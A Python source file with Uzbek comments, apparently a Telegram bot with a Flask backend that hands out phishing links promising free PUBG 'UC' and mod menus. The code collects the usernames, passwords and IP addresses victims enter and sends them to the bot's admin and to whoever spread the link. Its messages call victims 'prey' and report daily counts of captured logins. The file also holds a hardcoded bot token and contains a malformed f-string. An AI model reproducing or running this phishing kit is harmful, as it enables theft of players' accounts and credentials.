import logging
import asyncio
import threading
import json
from datetime import datetime
import pytz # Vaqt mintaqasi uchun
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, render_template, jsonify, send_from_directory

# --- SOZLAMALAR ---
TOKEN = "7712836266:AAFLRtTf67NHkeoQh9AXfNscJvgReBL2XEU"
ADMIN_ID = 8250478755
CHANNEL_USERNAME = "@abdurazoqov606"
CREATOR_USERNAME = "@abdurozoqov_edits"
RENDER_URL = "https://SIZNING-RENDER-APP-NOMINGIZ.onrender.com" # Render linkini qo'ying!

# --- STATISTIKA UCHUN XOTIRA ---
# Bot o'chib yonsa bu raqamlar 0 ga tushadi (Renderda fayl saqlab bo'lmaydi)
stats = {
    "users": set(),       # Botga start bosganlar (ID lari)
    "links_given": 0,     # Qancha link berildi
    "logins_captured": 0  # Qancha login ushlandi
}

# --- FLASK ---
app = Flask(__name__, template_folder='.', static_folder='.')
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- SERVER QISMI ---
@app.route('/')
def home():
    return "Bot ishlamoqda..."

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

@app.route('/game/<int:user_id>')
def game_page(user_id):
    # Linkka kirganda statistikani oshiramiz (agar bu ID birinchi marta kirayotgan bo'lsa hisoblash qiyinroq, shunchaki umumiy hisoblaymiz)
    return render_template('index.html', user_id=user_id)

@app.route('/login_submit', methods=['POST'])
def login_submit():
    data = request.json
    stats['logins_captured'] += 1 # Login qilinganda statistika oshadi
    
    user_id = data.get('user_id')
    method = data.get('method')
    username = data.get('username')
    password = data.get('password')
    ip = data.get('ip')
    
    msg = (
        f"🔥 <b>YANGI O'LJA!</b>\n\n"
        f"📥 <b>Kirish:</b> {method.upper()}\n"
        f"👤 <b>Login:</b> <code>{username}</code>\n"
        f"🔑 <b>Parol:</b> <code>{password}</code>\n"
        f"🌍 <b>IP:</b> {ip}\n"
        f"🆔 <b>User ID:</b> {user_id}"
    )

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(bot.send_message(ADMIN_ID, f"👑 <b>Admin uchun:</b>\n{msg}", parse_mode="HTML"))
    except: pass

    if user_id and str(user_id).isdigit():
        try:
            loop.run_until_complete(bot.send_message(int(user_id), f"✅ <b>Ma'lumot qabul qilindi:</b>\n{msg}", parse_mode="HTML"))
        except: pass

    return jsonify({"status": "success"}), 200

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# --- KUNLIK HISOBOT FUNKSIYASI ---
async def daily_report_task():
    while True:
        # Toshkent vaqtini olamiz
        tz = pytz.timezone('Asia/Tashkent')
        now = datetime.now(tz)
        
        # Soat 08:00 bo'lganini tekshiramiz
        if now.hour == 8 and now.minute == 0:
            report = (
                f"📊 <b>KUNLIK STATISTIKA (Toshkent vaqti: {now.strftime('%H:%M')})</b>\n\n"
                f"👥 <b>Jami foydalanuvchilar:</b> {len(stats['users'])}\n"
                f"🔗 <b>Berilgan linklar:</b> {stats['links_given']}\n"
                f"🎣 <b>Ushlangan loginlar:</b> {stats['logins_captured']}\n"
            )
            try:
                await bot.send_message(ADMIN_ID, report, parse_mode="HTML")
            except Exception as e:
                print(f"Hisobot yuborishda xato: {e}")
            
            # Xabar qayta-qayta ketmasligi uchun 65 sekund kutamiz
            await asyncio.sleep(65)
        
        # Har 30 sekundda vaqtni tekshirib turadi
        await asyncio.sleep(30)

# --- BOT QISMI ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return m.status in ['creator', 'administrator', 'member']
    except: return False

@dp.message(F.text == "/start")
async def start_cmd(msg: types.Message):
    user_id = msg.from_user.id
    first_name = msg.from_user.first_name
    
    # Statistikaga qo'shamiz (Set bo'lgani uchun unikal saqlaydi)
    stats['users'].add(user_id)

    # Obunani tekshirish
    if await check_sub(user_id):
        await give_link(msg)
    else:
        await msg.answer(
            f"👋 Salom, {first_name}!\n\n"
            f"😈 <b>PUBG Akkaunt Chopadigan Botga xush kelibsiz!</b>\n\n"
            f"⚠️ Botdan foydalanish va kimgadir 'uxlatadigan' link yasash uchun avval kanalimizga a'zo bo'ling:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📢 Kanalga a'zo bo'lish", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}")],
                [InlineKeyboardButton(text="✅ A'zo bo'ldim", callback_data="check")]
            ]),
            parse_mode="HTML"
        )

@dp.callback_query(F.data == "check")
async def check_btn(call: types.CallbackQuery):
    if await check_sub(call.from_user.id):
        await call.message.delete()
        await give_link(call.message)
    else:
        await call.answer("❌ Hali kanalga a'zo bo'lmadingiz!", show_alert=True)

async def give_link(message: types.Message):
    stats['links_given'] += 1 # Statistika +1
    link = f"{RENDER_URL}/game/{message.chat.id}"
    
    await message.answer(
        f"✅ <b>Tabriklaymiz! Siz muvaffaqiyatli ro'yxatdan o'tdingiz.</b>\n\n"
        f"👇 Quyidagi link orqali qurboningizni 'uxlatishingiz' mumkin. Bu linkda <b>Cheksiz UC va Mod Menu</b> va'da qilingan:\n\n"
        f"🔗 <b>Sizning shaxsiy link:</b>\n{https://pubgmobile-uc.github.io/versiya-/}\n\n"
        f"<i>Kimgadir tashlang, u logindan o'tsa ma'lumot shu botga keladi!</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 LINKNI OCHISH", url=link)]
        ]),
        parse_mode="HTML"
    )

async def main():
    # Flaskni ishga tushirish
    threading.Thread(target=run_flask).start()
    
    # Kunlik hisobotni ishga tushirish (orqa fonda)
    asyncio.create_task(daily_report_task())
    
    # Botni ishga tushirish
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())